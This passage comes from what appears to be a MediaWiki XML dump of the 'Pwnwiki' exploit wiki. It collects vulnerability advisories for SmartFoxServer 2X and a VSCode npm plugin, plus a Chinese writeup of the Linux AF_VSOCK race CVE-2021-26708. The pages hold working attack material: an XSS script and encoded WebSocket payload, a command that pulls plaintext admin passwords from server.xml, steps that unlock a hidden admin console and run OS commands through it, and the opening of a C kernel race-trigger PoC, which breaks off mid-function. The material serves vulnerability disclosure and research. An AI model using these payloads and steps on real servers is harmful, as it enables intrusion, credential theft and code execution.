22 053bd2e8 695d46a7 MSHTML!DllGetClassObject+0x718d
23 053bd300 6950dccc MSHTML!DllGetClassObject+0x70a7
24 053bd378 6967d357 MSHTML!TravelLogCreateInstance+0x25cec
25 053bd3c8 69510f32 MSHTML!DllCanUnloadNow+0x13957
26 053bd3e4 76d0ef5b MSHTML!TravelLogCreateInstance+0x28f52
27 053bd410 76d05eca USER32!_InternalCallWinProc+0x2b
28 053bd4f4 76d03c3a USER32!UserCallWinProcCheckWow+0x33a
29 053bd568 76d03a00 USER32!DispatchMessageWorker+0x22a
2a 053bd574 6ad32cd4 USER32!DispatchMessageW+0x10
2b 053bf720 6ad31db3 IEFRAME!Ordinal245+0x1cb4
2c 053bf7e0 6a5bcb2c IEFRAME!Ordinal245+0xd93
2d 053bf7f8 731e26ed msIso+0x1cb2c
2e 053bf830 756cfa29 IEShims!NS_CreateThread::AutomationIE_ThreadProc+0x8d
2f 053bf840 770676b4 KERNEL32!BaseThreadInitThunk+0x19
30 053bf89c 77067684 ntdll!RtlGetAppContainerNamedObjectPath+0xe4
31 053bf8ac 00000000 ntdll!RtlGetAppContainerNamedObjectPath+0xb4

############################################################


This bug is subject to a 90 day disclosure deadline. After 90 days elapse,
the bug report will become visible to the public. The scheduled disclosure
date is 2021-05-13. Disclosure at an earlier date is possible if
agreed upon by all parties.


Related CVE Numbers: CVE-2021-26419.



Found by: ifratric@google.com
&lt;/pre&gt;</text>
      <sha1>kvxcz34egylekrnejge4nuny3wkthn4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26549 SmartFoxServer 2X 2.17.0 God Mode Console WebSocket XSS漏洞</title>
    <ns>0</ns>
    <id>3136</id>
    <revision>
      <id>3639</id>
      <timestamp>2021-05-30T03:05:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; SmartFoxServer 2X 2.17.0 God Mode Console WebSocket XSS   Vendor: gotoAndPlay() Product web page: https://www.smartfoxserver.com Affected version: Server: 2.17.0..."</comment>
      <origin>3639</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2724" sha1="4d15q3u3ycu0hv90z84umi417j43nfm" xml:space="preserve">&lt;pre&gt;
SmartFoxServer 2X 2.17.0 God Mode Console WebSocket XSS


Vendor: gotoAndPlay()
Product web page: https://www.smartfoxserver.com
Affected version: Server: 2.17.0
                  Remote Admin: 3.2.6
                  SmartFoxServer 2X, Pro, Basic

Summary: SmartFoxServer (SFS) is a comprehensive SDK for
rapidly developing multiplayer games and applications
with Adobe Flash/Flex/Air, Unity, HTML5, iOS, Universal
Windows Platform, Android, Java, C++ and more. SmartFoxServer
comes with a rich set of features, an impressive
documentation set, tens of examples with their source,
powerful administration tools and a very active support
forum. Born in 2004, and evolving continuously since
then, today SmartFoxServer is the leading middleware to
create large scale multiplayer games, MMOs and virtual
communities. Thanks to its simplicity of use, versatility
and performance, it currently powers hundreds of projects
all over the world, from small chats and turn-based games
to massive virtual worlds and realtime games.

Desc: Authenticated Cross-Site Scripting was discovered.
Input passed to the AdminTool console is not properly
sanitized before being returned to the user. This can be
exploited to execute arbitrary HTML code in a user's browser
session in context of an affected site.

-----------------------------------------------------------------
/ConsoleModuleReqHandler.java:
------------------------------

 private String checkHTML(String data) {
     if (data.indexOf(60) &gt; -1 &amp;&amp; data.indexOf("&lt;span") == -1) {
         data = data.replaceAll("\\&lt;", "&lt;");
         return data.replaceAll("\\&gt;", "&gt;");
     }
     return data;

-----------------------------------------------------------------

Tested on: Windows (all) 64bit installer
           Linux/Unix 64bit installer
           MacOS (10.8+) 64bit installer
           Java 1.8.0_281
           Python 3.9.1
           Python 2.7.14


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2021-5626
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5626.php

CVE ID: CVE-2021-26549
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-26549
NIST URL: https://nvd.nist.gov/vuln/detail/CVE-2021-26549


29.01.2021

--


Typing payload:
&lt;script&gt;confirm(document.URL)

WebSocket payload:
\x80\x00\x52\x12\x00\x03\x00\x01\x63\x02\x01\x00
\x01\x61\x03\x00\x0D\x00\x01\x70\x12\x00\x03\x00
\x01\x63\x08\x00\x0C\x63\x6F\x6E\x73\x6F\x6C\x65
\x2E\x68\x69\x6E\x74\x00\x01\x72\x04\xFF\xFF\xFF
\xFF\x00\x01\x70\x12\x00\x01\x00\x01\x63\x08\x00
\x18\x3C\x73\x63\x72\x69\x70\x74\x3E\x63\x6F\x6E
\x66\x69\x72\x6D\x28\x64\x6F\x63\x75\x6D\x65\x6E
\x74\x2E\x55\x52\x4C\x29
&lt;/pre&gt;</text>
      <sha1>4d15q3u3ycu0hv90z84umi417j43nfm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26550 SmartFoxServer 2X 2.17.0 憑證洩露漏洞</title>
    <ns>0</ns>
    <id>3135</id>
    <revision>
      <id>3638</id>
      <timestamp>2021-05-30T03:04:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; SmartFoxServer 2X 2.17.0 Credentials Disclosure   Vendor: gotoAndPlay() Product web page: https://www.smartfoxserver.com Affected version: Server: 2.17.0..."</comment>
      <origin>3638</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2457" sha1="d4q7shnsg0fv2xe059vwceybmifdnf1" xml:space="preserve">&lt;pre&gt;
SmartFoxServer 2X 2.17.0 Credentials Disclosure


Vendor: gotoAndPlay()
Product web page: https://www.smartfoxserver.com
Affected version: Server: 2.17.0
                  Remote Admin: 3.2.6
                  SmartFoxServer 2X, Pro, Basic

Summary: SmartFoxServer (SFS) is a comprehensive SDK for
rapidly developing multiplayer games and applications
with Adobe Flash/Flex/Air, Unity, HTML5, iOS, Universal
Windows Platform, Android, Java, C++ and more. SmartFoxServer
comes with a rich set of features, an impressive
documentation set, tens of examples with their source,
powerful administration tools and a very active support
forum. Born in 2004, and evolving continuously since
then, today SmartFoxServer is the leading middleware to
create large scale multiplayer games, MMOs and virtual
communities. Thanks to its simplicity of use, versatility
and performance, it currently powers hundreds of projects
all over the world, from small chats and turn-based games
to massive virtual worlds and realtime games.

Desc: The application stores sensitive information in an
unencrypted XML file called /config/server.xml. A local
attacker that has access to the current user session can
successfully disclose plain-text credentials that can be
used to bypass authentication to the affected server.

Tested on: Windows (all) 64bit installer
           Linux/Unix 64bit installer
           MacOS (10.8+) 64bit installer
           Java 1.8.0_281
           Python 3.9.1
           Python 2.7.14


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2021-5627
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5627.php

CVE ID: CVE-2021-26550
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-26550
NIST URL: https://nvd.nist.gov/vuln/detail/CVE-2021-26550

CWE ID: CWE-312
CWE URL: https://cwe.mitre.org/data/definitions/312.html


29.01.2021

--


PS C:\Users\t00t\SmartFoxServer_2X\SFS2X\config&gt; Get-Content server.xml | Select-String -Pattern passw -Context 1,0

          &lt;login&gt;sfsadmin&lt;/login&gt;
&gt;         &lt;password&gt;Waddup&lt;/password&gt;
          &lt;login&gt;testingus&lt;/login&gt;
&gt;         &lt;password&gt;123456&lt;/password&gt;
      &lt;mailUser&gt;username&lt;/mailUser&gt;
&gt;     &lt;mailPass&gt;password&lt;/mailPass&gt;


C:\Users\t00t\SmartFoxServer_2X\SFS2X\config&gt;icacls server.xml
server.xml NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Administrators:(I)(F)
           LAB42\t00t:(I)(F)
&lt;/pre&gt;</text>
      <sha1>d4q7shnsg0fv2xe059vwceybmifdnf1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26551 SmartFoxServer 2X version 2.17.0 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3134</id>
    <revision>
      <id>3637</id>
      <timestamp>2021-05-30T03:03:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; SmartFoxServer 2X 2.17.0 God Mode Console Remote Code Execution   Vendor: gotoAndPlay() Product web page: https://www.smartfoxserver.com Affected version: Server: 2.17.0..."</comment>
      <origin>3637</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="14356" sha1="bewl9sjkrippp48ytn99hm0fsl5muga" xml:space="preserve">&lt;pre&gt;
SmartFoxServer 2X 2.17.0 God Mode Console Remote Code Execution


Vendor: gotoAndPlay()
Product web page: https://www.smartfoxserver.com
Affected version: Server: 2.17.0
                  Remote Admin: 3.2.6
                  SmartFoxServer 2X, Pro, Basic

Summary: SmartFoxServer (SFS) is a comprehensive SDK for
rapidly developing multiplayer games and applications
with Adobe Flash/Flex/Air, Unity, HTML5, iOS, Universal
Windows Platform, Android, Java, C++ and more. SmartFoxServer
comes with a rich set of features, an impressive
documentation set, tens of examples with their source,
powerful administration tools and a very active support
forum. Born in 2004, and evolving continuously since
then, today SmartFoxServer is the leading middleware to
create large scale multiplayer games, MMOs and virtual
communities. Thanks to its simplicity of use, versatility
and performance, it currently powers hundreds of projects
all over the world, from small chats and turn-based games
to massive virtual worlds and realtime games.

Desc: An authenticated attacker can execute remote arbitrary
Python code after enabling and unlocking the undocumented
console module.

Tested on: Windows (all) 64bit installer
           Linux/Unix 64bit installer
           MacOS (10.8+) 64bit installer
           Java 1.8.0_281
           Python 3.9.1
           Python 2.7.14


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2021-5628
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5628.php

CVE ID: CVE-2021-26551
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-26551
NIST URL: https://nvd.nist.gov/vuln/detail/CVE-2021-26551


29.01.2021

--


------------------------------------------------------
Undocumented functionality in software
#INABIAF (https://en.wikipedia.org/wiki/Undocumented_feature)
          See also:
            - Backdoor (computing)
            - Easter egg (media)
God Mode Console (Console Module) unlock instructions:
------------------------------------------------------

$ pwd
/config/admin
$ vi /admintool.xml # Uncomment &lt;module id="Console" name="Console" description="Interact with the SmartFoxServer instance via command line"/&gt;
$ cd .. ;pwd
/config
$ touch ConsoleModuleUnlock.txt


Mac/Windows PoC:
----------------

GET http://localhost:8080/admin/modules/console.html HTTP/1.1

--------------------------------------
ADMIN_CONSOLE, version 3.0.0
--------------------------------------
Type help() for assistance.

&gt; help()
zm      SFSZoneManager
sfs     SmartFoxServer
um      SFSUserManager
api     SFSApi
bum     SFSBannedUserManager
xm      SFSExtensionManager
eng     BitSwarmEngine
sm      DefaultSessionManager

extras()    For more custom function calls
shortcuts() For keyboard shortcuts details

&gt; eng
com.smartfoxserver.bitswarm.core.BitSwarmEngine@3823acc4
&gt; extras()
version():                Shows the Console extension version
reloadScripts():          Reload the dynamic server scripts
execute():                Launches the last loaded script again
files(path):              Shows the files at the specified path
controller(id):           Obtain one of the controllers from its id. 0=System, 1=Extension, 2=Smasher
zones():                  List of active zones

&gt; version()
2.0.1
&gt; files(".") # Win64
['config', 'data', 'extensions', 'lib', 'logs', 'sfs2x-service.exe', 'sfs2x-service.vmoptions', 'sfs2x-standalone.exe', 'sfs2x-standalone.vmoptions', 'sfs2x.bat', 'www', 'zones']
&gt; files(".") # MacOS
['zones', 'config', 'www', 'extensions', 'logs', 'lib', 'sfs2x-service.vmoptions', 'sfs2x-standalone.vmoptions', 'sfs2x.-standalone', 'data', 'sfs2x-service']
&gt; import os
&gt; os.name
java
&gt; os.system("C:\\windows\\system32\\calc.exe") # Win64
1

&gt; import popen2
&gt; os.popen2("""osascript -e 'tell app "Calculator" to open'""") # MacOS
1

&gt; 


gmc.py:
-------

#
#  _____ _____ ____     _____ _____ ____  _____
# |   __|     |    \   |     |     |    \|   __|
# |  |  |  |  |  |  |  | | | |  |  |  |  |   __|
# |_____|_____|____/   |_|_|_|_____|____/|_____|
#  _____ _____ _____ _____ _____ __    _____
# |     |     |   | |   __|     |  |  |   __|
# |   --|  |  | | | |__   |  |  |  |__|   __|
# |_____|_____|_|___|_____|_____|_____|_____|
#
# SmartFoxServer2X Admin Console Scripts
#
# (c) 2012-2016 gotoAndPlay()
# @author Marco Lapi
#
# Version 2.x
#

# Python Imports
import types
import sys


#
# This global variable allows to lock the Console so that it can't be misused
#
__CONSOLE_LOCK = False

# Java Imports
import java
from com.smartfoxserver.v2.entities.data import *

__scripts = [
        {'name':'version()', 'doc':'Shows the Console extension version'},
        {'name':'reloadScripts()', 'doc':'Reload the dynamic server scripts'},
        {'name':'execute()', 'doc':'Launches the last loaded script again'},
        {'name':'files(path)', 'doc':'Shows the files at the specified path'},
        {'name':'controller(id)', 'doc':'Obtain one of the controllers from its id. 0=System, 1=Extension, 2=Smasher'},
        {'name':'zones()', 'doc':'List of active zones'}

...
...


javashell.py:
-------------

        # override defaults based on osType
        if osType == "nt":
            shellCmd = ["cmd", "/c"]
            envCmd = "set"
            envTransform = string.upper
        elif osType == "dos":
            shellCmd = ["command.com", "/c"]
            envCmd = "set"
            envTransform = string.upper
        elif osType == "posix":
            shellCmd = ["sh", "-c"]
            envCmd = "env"
        elif osType == "mac":
            curdir = ':'  # override Posix directories
            pardir = '::' 
        elif osType == "None":
            pass
        # else:
        #    # may want a warning, but only at high verbosity:
        #    __warn( "Unknown os type '%s', using default behavior." % osType )

    return _ShellEnv( shellCmd, envCmd, envTransform )



com--|
     |--smartfoxserver--|
                        |--v2--|
                               |--admin--|
                                         |--handlers--|
                                                      |--requests--|
                                                                   |--ConsoleModuleReqHandler.java:
---------------------------------------------------------------------------------------------------

package com.smartfoxserver.v2.admin.handlers.requests;

import org.python.core.PyJavaInstance;
import org.python.core.PyException;
import com.smartfoxserver.v2.SmartFoxServer;
import java.io.IOException;
import org.apache.commons.io.FileUtils;
import java.io.File;
import com.smartfoxserver.bitswarm.core.BitSwarmEngine;
import org.python.core.PyString;
import org.python.core.Py;
import org.python.core.PySystemState;
import com.smartfoxserver.v2.entities.data.SFSObject;
import com.smartfoxserver.v2.extensions.ExtensionLogLevel;
import com.smartfoxserver.v2.entities.data.ISFSObject;
import com.smartfoxserver.v2.entities.User;
import org.python.core.PyObject;
import org.python.util.PythonInterpreter;
import com.smartfoxserver.v2.annotations.Instantiation;
import com.smartfoxserver.v2.annotations.MultiHandler;

@MultiHandler
@Instantiation(Instantiation.InstantiationMode.SINGLE_INSTANCE)
public class ConsoleModuleReqHandler extends BaseAdminModuleReqHandler
{
    public static final String MODULE_ID = "Console";
    public static final String VER = "2.0.1";
    private static final String MODULE_UNLOCK_FILE = "ConsoleModuleUnlock.txt";
    private static final String COMMANDS_PREFIX = "console";
    private static final String FN_HINTS = "__hints__";
    private static final String CONSOLE_LOCK = "__CONSOLE_LOCK";
    private static final String CMD_RELOAD_SCRIPTS = "reloadScripts()";
    private static final String SCRIPT_PATH = "config/admin/gmc/";
    private static final String MAIN_SCRIPT = "gmc.py";
    private static final String GRID_SCRIPT = "gmc-grid.py";
    private final String REQ_CMD = "cmd";
    private final String REQ_HINT = "hint";
    private final String REQ_SCRIPT = "script";
    private final String RES_ERROR_LOCKED = "locked";
    protected PythonInterpreter runTime;
    private PyObject fnGetHints;
    private volatile boolean inited;
    
    public ConsoleModuleReqHandler() {
        super("console", "Console");
        this.inited = false;
    }
    
    public void handleAdminRequest(final User sender, final ISFSObject params) {
        if (!this.inited) {
            this.init();
        }
        if (!this.isModuleUnlocked()) {
            this.trace(ExtensionLogLevel.WARN, "Console module is locked. Request denied");
            this.sendResponse("locked", (ISFSObject)new SFSObject(), sender);
            return;
        }
        final String cmd = params.getUtfString("__[[REQUEST_ID]]__");
        if (cmd.equals("cmd")) {
            this.handleCommand(params, sender);
        }
        else if (cmd.equals("hint")) {
            this.handleCodeHint(params, sender);
        }
        else if (cmd.equals("script")) {
            this.handleScript(params, sender);
        }
    }
    
    public synchronized void init() {
        final String script = this.loadMainScript();
        if (script == null) {
            throw new RuntimeException("Cannot load AdminConsole's helper script! Plase reinstall this Extension making sure to follow the documentation step by step.");
        }
        this.runTime = new PythonInterpreter((PyObject)null, new PySystemState());
        final PySystemState sys = Py.getSystemState();
        sys.path.append((PyObject)new PyString("./extensions/"));
        sys.path.append((PyObject)new PyString("./extensions/__lib__/AdminConsole/"));
        this.runTime.set("sfs", (Object)this.sfs);
        this.runTime.set("eng", (Object)BitSwarmEngine.getInstance());
        this.runTime.set("api", (Object)this.sfs.getAPIManager().getSFSApi());
        this.runTime.set("um", (Object)this.sfs.getUserManager());
        this.runTime.set("zm", (Object)this.sfs.getZoneManager());
        this.runTime.set("xm", (Object)this.sfs.getExtensionManager());
        this.runTime.set("bum", (Object)this.sfs.getBannedUserManager());
        this.runTime.set("sm", (Object)this.sfs.getSessionManager());
        this.runTime.set("__parent__", (Object)this);
        this.runTime.exec("_2XGlobals_ = {'sfs':sfs,'eng':eng,'api':api,'um':um,'zm':zm,'xm':xm,'bum':bum,'sm':sm}");
        this.runTime.exec(script);
        this.fnGetHints = this.runTime.get("__hints__");
        this.inited = true;
    }
    
    private String loadMainScript() {
        String script = null;
        try {
            script = FileUtils.readFileToString(new File("config/admin/gmc/gmc.py"));
        }
        catch (IOException ex) {}
        if (SmartFoxServer.grid()) {
            String gridScript = null;
            try {
                gridScript = FileUtils.readFileToString(new File("config/admin/gmc/gmc-grid.py"));
                script = String.valueOf(script) + gridScript;
            }
            catch (IOException ex2) {}
        }
        return script;
    }
    
    private void handleCommand(final ISFSObject params, final User sender) {
        PyException err = null;
        final String cmd = params.getUtfString("c");
        PyObject result = null;
        ISFSObject response = null;
        if (!cmd.equals("reloadScripts()")) {
            this.checkConsoleLock();
        }
        try {
            result = this.runTime.eval(cmd);
        }
        catch (PyException err3) {
            try {
                this.runTime.exec(cmd);
            }
            catch (PyException err2) {
                err = err2;
            }
        }
        if (result != null) {
            String repr = null;
            if (result instanceof PyJavaInstance) {
                final Object o = ((PyJavaInstance)result).__tojava__((Class)Object.class);
                repr = o.toString();
            }
            else {
                repr = result.toString();
            }
            repr = this.checkHTML(repr);
            response = (ISFSObject)new SFSObject();
            response.putUtfString("r", repr);
        }
        else if (err != null) {
            response = (ISFSObject)new SFSObject();
            response.putUtfString("e", err.toString());
        }
        this.sendResponse("cmd", response, sender);
    }
    
    private void handleCodeHint(final ISFSObject params, final User sender) {
        this.checkConsoleLock();
        final String cmd = params.getUtfString("c");
        try {
            final PyObject pyObj = this.runTime.eval(cmd);
            final PyObject res = this.fnGetHints.__call__(pyObj, (PyObject)new PyJavaInstance((Object)sender));
            final SFSObject sfso = (SFSObject)res.__tojava__((Class)SFSObject.class);
            this.sendResponse("hint", (ISFSObject)sfso, sender);
        }
        catch (PyException ex) {}
    }
    
    private void handleScript(final ISFSObject params, final User sender) {
        this.checkConsoleLock();
        final byte[] data = params.getByteArray("script");
        final String scriptData = new String(data);
        final ISFSObject response = (ISFSObject)new SFSObject();
        try {
            this.runTime.exec(scriptData);
            final PyObject fnExecute = this.runTime.get("execute");
            final PyObject res = fnExecute.__call__();
            response.putUtfString("r", res.toString());
        }
        catch (PyException err) {
            response.putUtfString("e", err.toString());
        }
        this.sendResponse("script", response, sender);
    }
    
    private String checkHTML(String data) {
        if (data.indexOf(60) &gt; -1 &amp;&amp; data.indexOf("&lt;span") == -1) {
            data = data.replaceAll("\\&lt;", "&lt;");
            return data.replaceAll("\\&gt;", "&gt;");
        }
        return data;
    }
    
    private void checkConsoleLock() {
        final Boolean locked = (Boolean)this.runTime.get("__CONSOLE_LOCK", (Class)Boolean.class);
        if (locked) {
            throw new IllegalStateException("Admin Console is locked.");
        }
    }
    
    private boolean isModuleUnlocked() {
        final File lock = new File("config/ConsoleModuleUnlock.txt");
        return lock.exists();
    }
}
&lt;/pre&gt;</text>
      <sha1>bewl9sjkrippp48ytn99hm0fsl5muga</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26700 NPM VSCode 插件遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1519</id>
    <revision>
      <id>1901</id>
      <timestamp>2021-04-27T06:58:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; https://github.com/jackadamson/CVE-2021-26700 &lt;/pre&gt;"</comment>
      <origin>1901</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="66" sha1="3cve5t9qlvno16as6j1cq4mgonkfk4l" xml:space="preserve">==POC==
&lt;pre&gt;
https://github.com/jackadamson/CVE-2021-26700
&lt;/pre&gt;</text>
      <sha1>3cve5t9qlvno16as6j1cq4mgonkfk4l</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞</title>
    <ns>0</ns>
    <id>1688</id>
    <revision>
      <id>2092</id>
      <timestamp>2021-05-04T03:21:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==脆弱點== &lt;/translate&gt;  &lt;translate&gt; 這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條..."</comment>
      <origin>2092</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="24834" sha1="kvuupkcyhqi6t2mda7h3cwnsroe0br3" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==脆弱點==
&lt;/translate&gt;

&lt;translate&gt;
這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條件競爭是在2019年11月添加VSOCK多傳輸支持的提交中隱式引入的，並被合併到Linux內核5.5-rc1版本中。

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;/translate&gt;
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;translate&gt;
&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。
&lt;/translate&gt;


&lt;translate&gt;
==內存破壞==
&lt;/translate&gt;

&lt;translate&gt;
下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;/translate&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



&lt;translate&gt;
第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;/translate&gt;
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


&lt;translate&gt;
為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;/translate&gt;
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;translate&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。

內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/translate&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;translate&gt;
这里，vvs是指向内核内存的指针，它已经在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被释放。&lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小为64字节，位于kmalloc-64块缓存中。buf_alloc字段类型为u32，位于偏移量40。&lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。*val的值由攻击者控制，它的四个最不重要的字节被写入释放的内存中。
&lt;/translate&gt;

&lt;translate&gt;
==模糊測試==
&lt;/translate&gt;

&lt;translate&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/translate&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;translate&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/translate&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
